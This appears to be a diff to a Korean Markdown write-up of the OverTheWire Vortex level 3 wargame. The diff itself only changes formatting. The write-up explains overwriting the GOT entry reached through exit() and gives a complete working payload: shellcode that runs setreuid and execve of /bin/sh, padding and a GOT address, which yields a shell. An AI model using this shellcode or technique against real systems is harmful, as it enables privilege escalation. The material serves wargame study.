@@ -316,17 +316,14 @@ if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
 다시 코드를 분석해보면 마지막 exit함수를 실행하며 종료한다.<br>
 exit함수가 호출될 때, got값을 가지고 있는 plt+2의 주소를 ipp가 가리키고 있다면?<br>
 **ipp는 &buf의 주소를 가지게 되기 때문에 쉘코드를 실행할 것이다.<br>
-[Vortex3](./imgs/level3/5.PNG)<br><br>
+[Vortex3](./imgs/level3/5.PNG)<br>
 plt가 시작하면 바로 jmp를 하고 있기 때문에, plt+2 부분에 got의 주소가 들어있다.<br>
 이 주소를 ipp가 가리키게 하려면 그 안에 덮어씌워야 할 것.<br>
-
 페이로드는 [쉘코드] + [Adummy] + [got주소] == 136바이트가 되야겠다.<br>
-
 페이로드<br>
 ```
 ./vortex3 $(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"+"A"*85+"\x12\x83\x04\x08"')
 ```
-
 작성한 페이로드는 이렇다.<br>
 [Vortex3](./imgs/level3/6.PNG)<br>
 정상적으로 쉘을 얻어오는 모습을 확인할 수 있다.<br>
